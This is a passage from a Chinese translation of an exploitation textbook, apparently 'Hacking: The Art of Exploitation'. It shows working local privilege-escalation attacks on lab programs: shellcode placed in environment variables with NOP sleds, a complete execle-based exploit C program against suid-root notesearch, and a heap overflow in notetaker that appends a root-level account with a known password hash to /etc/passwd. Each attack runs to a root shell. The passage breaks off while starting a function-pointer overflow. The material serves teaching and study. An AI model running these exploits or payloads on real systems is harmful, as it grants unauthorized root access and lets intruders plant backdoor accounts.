reader@hacking:~/booksrc $ head exploit_notesearch.c | grep "^\"" | cut -d\" -f2
\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68
\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89
\xe1\xcd\x80
reader@hacking:~/booksrc $
```

程序的前 10 行被管道传输到`grep`，它只显示以引号开头的行。这可以隔离包含 shellcode 的行，然后使用选项将它们管道传输到`cut`，以显示两个引号之间的字节。

BASH 的 for 循环实际上可以用来将每一行发送到`echo`命令，带有命令行选项以识别十六进制展开并抑制在末尾添加换行符。

```
reader@hacking:~/booksrc $ for i in $(head exploit_notesearch.c | grep "^\"" | cut -d\"
 -f2)

> do
> echo -en $i
> done > shellcode.bin
reader@hacking:~/booksrc $ hexdump -C shellcode.bin 
00000000  31 c0 31 db 31 c9 99 b0  a4 cd 80 6a 0b 58 51 68  |1.1.1......j.XQh|
00000010  2f 2f 73 68 68 2f 62 69  6e 89 e3 51 89 e2 53 89  |//shh/bin..Q..S.|
00000020  e1 cd 80                                          |...|
00000023 
reader@hacking:~/booksrc $
```

现在我们有一个名为`shellcode.bin`的文件，其中包含 shellcode。这可以通过命令替换与 shellcode 一起放入环境变量中，并附带一个慷慨的 NOP 滑梯。

```
reader@hacking:~/booksrc $ export SHELLCODE=$(perl -e 'print "\x90"x200')$(cat
 shellcode.bin)
reader@hacking:~/booksrc $ echo $SHELLCODE
␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣
␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣
␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣␣1␣1␣1␣␣␣ j
                                     XQh//shh/bin␣␣Q␣␣S␣␣
reader@hacking:~/booksrc $
```

就这样，shellcode 现在被放在了栈中的环境变量里，附带一个 200 字节的 NOP 滑梯。这意味着我们只需要在该滑梯范围内的某个地址上覆盖保存的返回地址即可。环境变量位于栈的底部附近，因此在调试器中运行 notesearch 时，我们应该在这里查找。

```
reader@hacking:~/booksrc $ gdb -q ./notesearch
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) break main
Breakpoint 1 at 0x804873c
(gdb) run
Starting program: /home/reader/booksrc/notesearch

Breakpoint 1, 0x0804873c in main ()
(gdb)
```

在`main()`的开始处设置一个断点，并运行程序。这将设置程序的内存，但在发生任何操作之前会停止。现在我们可以检查栈底附近的内存。

```
(gdb) i r esp
esp            0xbffff660      0xbffff660
(gdb) x/24s $esp + 0x240
0xbffff8a0:      ""
0xbffff8a1:      ""
0xbffff8a2:      ""
0xbffff8a3:      ""
0xbffff8a4:      ""
0xbffff8a5:      ""
0xbffff8a6:      ""
0xbffff8a7:      ""
0xbffff8a8:      ""
0xbffff8a9:      ""
0xbffff8aa:      ""
0xbffff8ab:      "i686"
0xbffff8b0:      "/home/reader/booksrc/notesearch"
0xbffff8d0:      "SSH_AGENT_PID=7531"
`0xbffffd56:      "SHELLCODE=", '\220' <repeats 190 times>...`
0xbffff9ab:      "\220\220\220\220\220\220\220\220\220\2201ï¿½1ï¿½1ï¿½\231ï¿½ï¿½ï¿½\200j\vXQh//
shh/bin\211ï¿½Q\211ï¿½S\211ï¿½ï¿½\200"
0xbffff9d9:      "TERM=xterm"
0xbffff9e4:      "DESKTOP_STARTUP_ID="
0xbffff9f8:      "SHELL=/bin/bash"
0xbffffa08:      "GTK_RC_FILES=/etc/gtk/gtkrc:/home/reader/.gtkrc-1.2-gnome2"
0xbffffa43:      "WINDOWID=39845969"
0xbffffa55:      "USER=reader"
0xbffffa61:
"LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;
33;01:or=
40;31;01:su=37;41:sg=30;43:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:
*.arj=01
;31:*.taz=0"...
0xbffffb29:
"1;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:
*.rpm=01;3
1:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:
*.ppm=01
;35:*.tga=0"...
(gdb) x/s 0xbffff8e3
0xbffff8e3:      "SHELLCODE=", '\220' <repeats 190 times>...
(gdb) x/s 0xbffff8e3 + 100
0xbffff947:      '\220' <repeats 110 times>, "1ï¿½1ï¿½1ï¿½\231ï¿½ï¿½ï¿½\200j\vXQh//shh/bin\
211ï¿½Q\211ï¿½S\211ï¿½ï¿½\200"
(gdb)
```

调试器揭示了 shellcode 的位置，如上图中加粗所示。（当程序在调试器外运行时，这些地址可能略有不同。）调试器还有一些关于栈的信息，这会稍微改变地址。但是，如果有 200 字节的 NOP 滑梯，如果选择滑梯中间的地址，这些不一致性就不会成为问题。在上面的输出中，地址`0xbffff947`显示接近 NOP 滑梯的中间，这应该给我们足够的操作空间。在确定注入的 shellcode 指令的地址后，利用方法就是简单地用这个地址覆盖返回地址。

```
reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\x47\xf9\xff\xbf"x40')
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
-------[ end of note data ]-------
sh-3.2# whoami
root 
sh-3.2#
```

目标地址被重复足够多次以溢出返回地址，执行返回到环境变量中的 NOP 滑梯，不可避免地导致 shellcode。在溢出缓冲区不足以容纳 shellcode 的情况下，可以使用带有大 NOP 滑梯的环境变量。这通常使利用变得容易得多。

一个巨大的 NOP 滑梯在需要猜测目标返回地址时非常有帮助，但结果表明，环境变量的位置比局部栈变量的位置更容易预测。在 C 的标准库中有一个名为`getenv()`的函数，它接受环境变量的名称作为其唯一参数，并返回该变量的内存地址。`getenv_example.c`中的代码展示了`getenv()`的使用。

### `getenv_example.c`

```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
   printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
```

编译并运行此程序将显示给定环境变量在内存中的位置。这为预测目标程序运行时相同环境变量将位于何处提供了更准确的预测。

```
reader@hacking:~/booksrc $ gcc getenv_example.c
reader@hacking:~/booksrc $ ./a.out SHELLCODE
SHELLCODE is at 0xbffff90b
reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\x0b\xf9\xff\xbf"x40')
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
-------[ end of note data ]------- 
sh-3.2#
```

使用大 NOP 滑梯时，这已经足够准确，但如果没有滑梯尝试做同样的事情，程序会崩溃。这意味着环境预测仍然不准确。

```
reader@hacking:~/booksrc $ export SLEDLESS=$(cat shellcode.bin)
reader@hacking:~/booksrc $ ./a.out SLEDLESS
SLEDLESS is at 0xbfffff46
reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\x46\xff\xff\xbf"x40')
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
-------[ end of note data ]-------
Segmentation fault
reader@hacking:~/booksrc $
```

为了能够预测一个确切的内存地址，必须探索地址之间的差异。正在执行程序的名称长度似乎对环境变量的地址有影响。通过更改程序名称并进行实验可以进一步探索这种影响。这种实验和模式识别对于黑客来说是一项重要的技能。

```
reader@hacking:~/booksrc $ cp a.out a
reader@hacking:~/booksrc $ ./a SLEDLESS
SLEDLESS is at 0xbfffff4e
reader@hacking:~/booksrc $ cp a.out bb
reader@hacking:~/booksrc $ ./bb SLEDLESS
SLEDLESS is at 0xbfffff4c
reader@hacking:~/booksrc $ cp a.out ccc
reader@hacking:~/booksrc $ ./ccc SLEDLESS
SLEDLESS is at 0xbfffff4a
reader@hacking:~/booksrc $ ./a.out SLEDLESS
SLEDLESS is at 0xbfffff46
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0xbfffff4e - 0xbfffff46
$1 = 8
(gdb) quit
reader@hacking:~/booksrc $
```

如前所述的实验显示，执行程序的名称长度会影响导出环境变量的位置。一般趋势似乎是在程序名称长度每增加一个字节的情况下，环境变量的地址减少两个字节。这对于程序名称 *a.out* 也是成立的，因为 *a.out* 和 *a* 之间的长度差异是四个字节，而地址 `0xbfffff4e` 和 `0xbfffff46` 之间的差异是八个字节。这意味着执行程序的名称也位于某个位置的栈上，这导致了偏移。

带着这种知识，当易受攻击的程序执行时，可以预测环境变量的确切地址。这意味着可以消除 NOP 滑梯的辅助手段。getenvaddr.c 程序根据程序名称长度的差异调整地址，以提供非常准确的预测。

### getenvaddr.c

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
   char *ptr;

   if(argc < 3) {
      printf("Usage: %s <environment var> <target program name>\n", argv[0]);
      exit(0);
   }
   ptr = getenv(argv[1]); /* Get env var location. */
   ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
   printf("%s will be at %p\n", argv[1], ptr);
}
```

当编译时，此程序可以准确预测在目标程序执行期间环境变量将在内存中的位置。这可以用来利用基于栈的缓冲区溢出，而无需 NOP 滑梯。

```
reader@hacking:~/booksrc $ gcc -o getenvaddr getenvaddr.c
reader@hacking:~/booksrc $ ./getenvaddr SLEDLESS ./notesearch
SLEDLESS will be at 0xbfffff3c
reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\x3c\xff\xff\xbf"x40')
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
```

如您所见，利用程序并不总是需要利用代码。在命令行中进行利用时，使用环境变量可以大大简化事情。但也可以使用这些变量来使利用代码更加可靠。

在 notesearch_exploit.c 程序中，使用 `system()` 函数执行命令。此函数启动一个新的进程，并使用 `/bin/sh -c` 运行命令。`-c` 告诉 `sh` 程序执行从命令行参数传递给它的命令。可以使用 Google 的代码搜索来查找此函数的源代码，这将告诉我们更多信息。请访问 [`www.google.com/codesearch?q=package:libc+system`](http://www.google.com/codesearch?q=package:libc+system) 以查看此代码的完整内容。

### 来自 libc-2.2.2 的代码

```
int system(const char * cmd)
{
        int ret, pid, waitstat;
        void (*sigint) (), (*sigquit) ();

        `if ((pid = fork()) == 0) {                 execl("/bin/sh", "sh", "-c", cmd, NULL);                 exit(127);         }`
        if (pid < 0) return(127 << 8);
        sigint = signal(SIGINT, SIG_IGN);
        sigquit = signal(SIGQUIT, SIG_IGN);
        while ((waitstat = wait(&ret)) != pid && waitstat != -1);
        if (waitstat == -1) ret = -1;
        signal(SIGINT, sigint);
        signal(SIGQUIT, sigquit);
        return(ret);
}
```

该函数的重要部分以粗体显示。`fork()` 函数启动一个新的进程，而 `execl()` 函数用于通过 /bin/sh 运行命令，并带有适当的命令行参数。

使用 `system()` 有时可能会引起问题。如果一个 setuid 程序使用 `system()`，权限不会传递，因为从版本二开始 /bin/sh 就在放弃权限。这种情况并不适用于我们的漏洞利用，但漏洞利用实际上也不需要启动新的进程。我们可以忽略 `fork()`，只关注 `execl()` 函数来运行命令。

`execl()` 函数属于一组通过替换当前进程为新进程来执行命令的函数。`execl()` 的参数从目标程序的路径开始，后面跟着每个命令行参数。第二个函数参数实际上是零号命令行参数，即程序的名称。最后一个参数是一个 NULL，用于终止参数列表，类似于空字节终止字符串的方式。

`execl()` 函数有一个姐妹函数叫做 `execle()`，它有一个额外的参数来指定执行进程应该运行的环境。这个环境以每个环境变量的空终止字符串指针数组的形式呈现，环境数组本身以一个 NULL 指针终止。

使用 `execl()` 时，会使用现有的环境，但如果使用 `execle()`，则可以指定整个环境。如果环境数组只是作为第一个字符串的 shellcode（以 NULL 指针终止列表），则唯一的环境变量将是 shellcode。这使得其地址很容易计算。在 Linux 中，地址将是 `0xbffffffa` 减去环境中的 shellcode 长度，减去执行程序名称的长度。由于这个地址将是精确的，因此不需要 NOP sled。漏洞利用缓冲区中只需要地址，重复足够次数以溢出栈中的返回地址，如 exploit_nosearch_env.c 所示。

### exploit_notesearch_env.c

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]) {
   char *env[2] = {shellcode, 0};
   unsigned int i, ret;

   char *buffer = (char *) malloc(160);

   ret = 0xbffffffa - (sizeof(shellcode)-1) - strlen("./notesearch");
   for(i=0; i < 160; i+=4)
      *((unsigned int *)(buffer+i)) = ret;

   execle("./notesearch", "notesearch", buffer, 0, env);
   free(buffer);
}
```

这个漏洞利用方法更可靠，因为它不需要 NOP sled 或对偏移量的任何猜测。此外，它不会启动任何额外的进程。

```
reader@hacking:~/booksrc $ gcc exploit_notesearch_env.c
reader@hacking:~/booksrc $ ./a.out
-------[ end of note data ]------- 
sh-3.2#
```

# 其他段的溢出

缓冲区溢出也可能发生在其他内存段，如堆和 bss。在 auth_overflow.c 中，如果重要的变量位于易受溢出攻击的缓冲区之后，程序的控制流可能会被改变。这一点适用于这些变量所在的任何内存段；然而，控制通常相当有限。能够找到这些控制点并学会充分利用它们只需要一些经验和创造性思维。虽然这些类型的溢出不像基于栈的溢出那样标准化，但它们同样有效。

## 基于堆的基本溢出

来自 第 0x200 章 的记事本程序也容易受到缓冲区溢出漏洞的影响。在堆上分配了两个缓冲区，第一个命令行参数被复制到第一个缓冲区。这里可能会发生溢出。

### 来自 notetaker.c 的摘录

```
   buffer = (char *) ec_malloc(100);
   datafile = (char *) ec_malloc(20);
   strcpy(datafile, "/var/notes");

   if(argc < 2)                // If there aren't command-line arguments,
      usage(argv[0], datafile); // display usage message and exit.

   `strcpy(buffer, argv[1]);  // Copy into buffer.`

   printf("[DEBUG] buffer   @ %p: \'%s\'\n", buffer, buffer);
   printf("[DEBUG] datafile @ %p: \'%s\'\n", datafile, datafile);
```

在正常情况下，缓冲区分配位于 `0x804a008`，在 `datafile` 分配的 `0x804a070` 之前，正如调试输出所示。这两个地址之间的距离是 104 字节。

```
reader@hacking:~/booksrc $ ./notetaker test
[DEBUG] buffer   @ 0x804a008: 'test'
[DEBUG] datafile @ 0x804a070: '/var/notes'
[DEBUG] file descriptor is 3
Note has been saved.
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0x804a070 - 0x804a008
$1 = 104
(gdb) quit
reader@hacking:~/booksrc $
```

由于第一个缓冲区是空终止的，因此在不溢出到下一个缓冲区的情况下，可以放入此缓冲区的最大数据量应该是 104 字节。

```
reader@hacking:~/booksrc $ ./notetaker $(perl -e 'print "A"x104')
[DEBUG] buffer   @ 0x804a008: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[DEBUG] datafile @ 0x804a070: ''
[!!] Fatal Error in main() while opening file: No such file or directory
reader@hacking:~/booksrc $
```

如预期的那样，当尝试 104 字节时，空终止字节溢出到 `datafile` 缓冲区的开始处。这导致 `datafile` 只是一个单独的空字节，显然不能作为一个文件打开。但如果 `datafile` 缓冲区被覆盖的内容不仅仅是空字节呢？

```
reader@hacking:~/booksrc $ ./notetaker $(perl -e 'print "A"x104 . "testfile"')
[DEBUG] buffer   @ 0x804a008: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtestfile'
[DEBUG] datafile @ 0x804a070: 'testfile'
[DEBUG] file descriptor is 3
Note has been saved.
*** glibc detected *** ./notetaker: free(): invalid next size (normal): 0x0804a008 ***
======= Backtrace: =========
/lib/tls/i686/cmov/libc.so.6[0xb7f017cd]
/lib/tls/i686/cmov/libc.so.6(cfree+0x90)[0xb7f04e30]
./notetaker[0x8048916]
/lib/tls/i686/cmov/libc.so.6(__libc_start_main+0xdc)[0xb7eafebc]
./notetaker[0x8048511]
======= Memory map: ========
08048000-08049000 r-xp 00000000 00:0f 44384      /cow/home/reader/booksrc/notetaker
08049000-0804a000 rw-p 00000000 00:0f 44384      /cow/home/reader/booksrc/notetaker
0804a000-0806b000 rw-p 0804a000 00:00 0          [heap]
b7d00000-b7d21000 rw-p b7d00000 00:00 0
b7d21000-b7e00000 ---p b7d21000 00:00 0
b7e83000-b7e8e000 r-xp 00000000 07:00 15444      /rofs/lib/libgcc_s.so.1
b7e8e000-b7e8f000 rw-p 0000a000 07:00 15444      /rofs/lib/libgcc_s.so.1

b7e99000-b7e9a000 rw-p b7e99000 00:00 0
b7e9a000-b7fd5000 r-xp 00000000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so
b7fd5000-b7fd6000 r--p 0013b000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so
b7fd6000-b7fd8000 rw-p 0013c000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so
b7fd8000-b7fdb000 rw-p b7fd8000 00:00 0
b7fe4000-b7fe7000 rw-p b7fe4000 00:00 0
b7fe7000-b8000000 r-xp 00000000 07:00 15421      /rofs/lib/ld-2.5.so
b8000000-b8002000 rw-p 00019000 07:00 15421      /rofs/lib/ld-2.5.so
bffeb000-c0000000 rw-p bffeb000 00:00 0          [stack]
ffffe000-fffff000 r-xp 00000000 00:00 0          [vdso]
Aborted
reader@hack ing:~/booksrc $
```

这次，溢出被设计用来用字符串 *testfile* 覆盖 `datafile` 缓冲区。这导致程序将数据写入 testfile 而不是按照最初编程的方式写入 /var/notes。然而，当通过 `free()` 命令释放堆内存时，检测到堆头错误，程序被终止。与堆溢出导致的返回地址覆盖类似，堆架构本身内部存在控制点。glibc 的最新版本使用的是专门为了对抗堆解除链接攻击而演化的堆内存管理函数。自 2.2.5 版本以来，这些函数已被重写，以便在检测到堆头信息问题时打印调试信息并终止程序。这使得 Linux 中的堆解除链接变得非常困难。然而，这个特定的漏洞利用并没有使用堆头信息来施展其魔法，因此在调用 `free()` 之前，程序已经被欺骗写入了一个新的文件，并且具有 root 权限。

```
reader@hacking:~/booksrc $ grep -B10 free notetaker.c

   if(write(fd, buffer, strlen(buffer)) == -1) // Write note.
      fatal("in main() while writing buffer to file");
   write(fd, "\n", 1); // Terminate line.

// Closing file
   if(close(fd) == -1)
      fatal("in main() while closing file");

   printf("Note has been saved.\n");
   free(buffer);
   free(datafile);
reader@hacking:~/booksrc $ ls -l ./testfile
-rw------- 1 root reader 118 2007-09-09 16:19 ./testfile
reader@hacking:~/booksrc $ cat ./testfile
cat: ./testfile: Permission denied
reader@hacking:~/booksrc $ sudo cat ./testfile
?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAA
AAAAAAAAAtestfile
reader@hacking:~/booksrc $
```

读取字符串直到遇到空字节，因此整个字符串作为 `userinput` 写入文件。由于这是一个 suid root 程序，因此创建的文件属于 root。这也意味着，由于可以控制文件名，可以将数据追加到任何文件。尽管这些数据有一些限制；它必须以受控的文件名结束，并且还会写入一个包含用户 ID 的行。

可能存在几种巧妙的方式来利用这种能力。最明显的一种是将内容追加到 /etc/passwd 文件中。该文件包含系统中所有用户的用户名、ID 和登录 shell。显然，这是一个关键的系统文件，所以在对其进行大量操作之前，制作一个备份副本是个好主意。

```
reader@hacking:~/booksrc $ cp /etc/passwd /tmp/passwd.bkup
reader@hacking:~/booksrc $ head /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
reader@hacking:~/booksrc $
```

/etc/passwd 文件中的字段由冒号分隔，第一个字段是登录名，然后是密码，用户 ID，组 ID，用户名，家目录，最后是登录 shell。密码字段都填充了 *x* 字符，因为加密密码存储在别处的一个影子文件中。（然而，这个字段可以包含加密密码。）此外，任何具有用户 ID 为 0 的密码文件条目都将获得 root 权限。这意味着目标是向密码文件追加一个具有 root 权限和已知密码的额外条目。

密码可以使用单向哈希算法进行加密。由于算法是单向的，原始密码不能从哈希值中重新创建。为了防止查找攻击，算法使用一个 *盐值*，该值的变化会为相同的输入密码生成不同的哈希值。这是一个常见的操作，Perl 有一个 `crypt()` 函数可以执行这个操作。第一个参数是密码，第二个是盐值。使用不同的盐值生成的相同密码会产生不同的盐。

```
reader@hacking:~/booksrc $ perl -e 'print crypt("password", "AA"). "\n"'
AA6tQYSfGxd/A
reader@hacking:~/booksrc $ perl -e 'print crypt("password", "XX"). "\n"'
XXq2wKiyI43A2
reader@hacking:~/booksrc $
```

注意到盐值总是在哈希的开始处。当用户登录并输入密码时，系统会查找该用户的加密密码。使用存储的加密密码中的盐值，系统使用相同的单向哈希算法加密用户输入的任何文本作为密码。最后，系统比较这两个哈希值；如果它们相同，则用户必须输入了正确的密码。这允许使用密码进行身份验证，而无需在系统上的任何地方存储密码。

在密码字段中使用这些哈希值之一将使账户的密码为 *password*，无论使用的盐值如何。要追加到 /etc/passwd 的行可能看起来像这样：

```
myroot:XXq2wKiyI43A2:0:0:me:/root:/bin/bash
```

然而，这个特定的堆溢出漏洞的性质不允许将这条确切的行写入 /etc/passwd，因为字符串必须以 /etc/passwd 结尾。然而，如果将那个文件名仅仅追加到条目末尾，密码文件条目就会不正确。这可以通过巧妙地使用符号文件链接来补偿，这样条目就可以以 /etc/passwd 结尾，同时仍然是密码文件中的一个有效行。下面是如何工作的：

```
reader@hacking:~/booksrc $ mkdir /tmp/etc
reader@hacking:~/booksrc $ ln -s /bin/bash /tmp/etc/passwd
reader@hacking:~/booksrc $ ls -l /tmp/etc/passwd
lrwxrwxrwx 1 reader reader 9 2007-09-09 16:25 /tmp/etc/passwd -> /bin/bash
reader@hacking:~/booksrc $
```

现在 /tmp/etc/passwd 指向登录 shell /bin/bash。这意味着密码文件的合法登录 shell 也是 /tmp/etc/passwd，因此以下行是一个有效的密码文件行：

```
myroot:XXq2wKiyI43A2:0:0:me:/root:/tmp/etc/passwd
```

这行值的修改只需稍微调整，使得在 /etc/passwd 之前的部分正好是 104 字节长：

```
reader@hacking:~/booksrc $ perl -e 'print "myroot:XXq2wKiyI43A2:0:0:me:/root:/tmp"' | wc
 -c
38
reader@hacking:~/booksrc $ perl -e 'print "myroot:XXq2wKiyI43A2:0:0:" . "A"x50 .
 ":/root:/tmp"'
| wc -c
86
reader@hacking:~/booksrc $ gdb -q
(gdb) p 104 - 86 + 50
$1 = 68
(gdb) quit
reader@hacking:~/booksrc $ `perl -e 'print "myroot:XXq2wKiyI43A2:0:0:" . "A"x68 .  ":/root:/tmp"'`
| wc -c
104
reader@hacking:~/booksrc $
```

如果将 /etc/passwd 添加到那个最终字符串的末尾（如粗体所示），上面的字符串将被追加到 /etc/passwd 文件的末尾。由于这一行定义了一个具有我们设置的密码的 root 权限账户，因此访问此账户并获得 root 权限不会很难，如下面的输出所示。

```
reader@hacking:~/booksrc $ ./notetaker $(perl -e 'print "myroot:XXq2wKiyI43A2:0:0:"
 . "A"x68 .
":/root:/tmp/etc/passwd"')
[DEBUG] buffer   @ 0x804a008: 'myroot:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd'
[DEBUG] datafile @ 0x804a070: '/etc/passwd'
[DEBUG] file descriptor is 3
Note has been saved.
*** glibc detected *** ./notetaker: free(): invalid next size (normal): 0x0804a008 ***
======= Backtrace: =========
/lib/tls/i686/cmov/libc.so.6[0xb7f017cd]
/lib/tls/i686/cmov/libc.so.6(cfree+0x90)[0xb7f04e30]
./notetaker[0x8048916]
/lib/tls/i686/cmov/libc.so.6(__libc_start_main+0xdc)[0xb7eafebc]
./notetaker[0x8048511]
======= Memory map: ========
08048000-08049000 r-xp 00000000 00:0f 44384      /cow/home/reader/booksrc/notetaker
08049000-0804a000 rw-p 00000000 00:0f 44384      /cow/home/reader/booksrc/notetaker
0804a000-0806b000 rw-p 0804a000 00:00 0          [heap]
b7d00000-b7d21000 rw-p b7d00000 00:00 0
b7d21000-b7e00000 ---p b7d21000 00:00 0
b7e83000-b7e8e000 r-xp 00000000 07:00 15444      /rofs/lib/libgcc_s.so.1
b7e8e000-b7e8f000 rw-p 0000a000 07:00 15444      /rofs/lib/libgcc_s.so.1
b7e99000-b7e9a000 rw-p b7e99000 00:00 0
b7e9a000-b7fd5000 r-xp 00000000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so
b7fd5000-b7fd6000 r--p 0013b000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so
b7fd6000-b7fd8000 rw-p 0013c000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so
b7fd8000-b7fdb000 rw-p b7fd8000 00:00 0
b7fe4000-b7fe7000 rw-p b7fe4000 00:00 0
b7fe7000-b8000000 r-xp 00000000 07:00 15421      /rofs/lib/ld-2.5.so
b8000000-b8002000 rw-p 00019000 07:00 15421      /rofs/lib/ld-2.5.so
bffeb000-c0000000 rw-p bffeb000 00:00 0          [stack]
ffffe000-fffff000 r-xp 00000000 00:00 0          [vdso]
Aborted
reader@hacking:~/booksrc $ tail /etc/passwd
avahi:x:105:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
cupsys:x:106:113::/home/cupsys:/bin/false
haldaemon:x:107:114:Hardware abstraction layer,,,:/home/haldaemon:/bin/false
hplip:x:108:7:HPLIP system user,,,:/var/run/hplip:/bin/false
gdm:x:109:118:Gnome Display Manager:/var/lib/gdm:/bin/false
matrix:x:500:500:User Acct:/home/matrix:/bin/bash
jose:x:501:501:Jose Ronnick:/home/jose:/bin/bash
reader:x:999:999:Hacker,,,:/home/reader:/bin/bash
?
myroot:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAA:/
root:/tmp/etc/passwd
reader@hacking:~/booksrc $ su myroot
Password:
root@hacking:/home/reader/booksrc# whoami
root
root@hacking:/home/reader/booksrc#
```

## 溢出函数指针

如果你已经足够多地玩过`game_of_chance.c`程序，你会意识到，类似于在赌场，大多数游戏在统计上偏向于庄家。这使得赢得积分变得困难，尽管你可能很幸运。也许有一种方法可以稍微平衡一下概率。这个程序使用函数指针来记住最后玩过的游戏。这个指针存储在`user`结构中，该结构被声明为全局变量。这意味着用户结构的所有内存都在 bss 段中分配。

### 来自`game_of_chance.c`

```
// Custom user struct to store information about users
struct user {
  int uid;
  int credits;
  int highscore;
  char name[100];
  int (*current_game) ();
};

...

// Global variables 
struct user player;      // Player struct
```

用户结构中的名称缓冲区很可能是溢出的地方。这个缓冲区是由下面的`input_name()`函数设置的：

```
// This function is used to input the player name, since 
// scanf("%s", &whatever) will stop input at the first space.
void input_name() {
   char *name_ptr, input_char='\n';
   while(input_char == '\n')     // Flush any leftover 
      scanf("%c", &input_char);  // newline chars.

   name_ptr = (char *) &(player.name); // name_ptr = player name's address
   while(input_char != '\n') {  // Loop until newline.
      *name_ptr = input_char;   // Put the input char into name field.
      scanf("%c", &input_char); // Get the next char.
      name_ptr++;               // Increment the name pointer.
   }
   *name_ptr = 0;  // Terminate the string. 
}
```

这个函数只在换行符处停止输入。没有任何东西限制它只能输入到目标名称缓冲区的长度，这意味着可能发生溢出。为了利用溢出，我们需要让程序在覆盖函数指针后调用它。这发生在`play_the_game()`函数中，该函数在从菜单中选择任何游戏时被调用。以下代码片段是菜单选择代码的一部分，用于选择和玩游戏。

```
	if((choice < 1) || (choice > 7))
	   printf("\n[!!] The number %d is an invalid selection.\n\n", choice);
	else if (choice < 4) {  // Otherwise, choice was a game of some sort.
	      if(choice != last_game) { // If the function ptr isn't set,
	         if(choice == 1)        // then point it at the selected game 
	            player.current_game = pick_a_number;
	         else if(choice == 2)
	            player.current_game = dealer_no_match;
	         else
	            player.current_game = find_the_ace;
	         last_game = choice;   // and set last_game.
	      }
	      play_the_game();   // Play the game.
	   }
```

如果`last_game`与当前选择不同，`current_game`的函数指针将被更改为适当的游戏。这意味着为了使程序调用函数指针而不覆盖它，必须先玩一个游戏来设置`last_game`变量。

```
reader@hacking:~/booksrc $ ./game_of_chance 
-=[ Game of Chance Menu ]=-
1 - Play the Pick a Number game
2 - Play the No Match Dealer game
3 - Play the Find the Ace game
4 - View current high score
5 - Change your user name
6 - Reset your account at 100 credits
7 - Quit
[Name: Jon Erickson]
[You have 70 credits] ->  1

[DEBUG] current_game pointer @ 0x08048fde

####### Pick a Number ######
This game costs 10 credits to play. Simply pick a number
between 1 and 20, and if you pick the winning number, you
will win the jackpot of 100 credits!

10 credits have been deducted from your account.
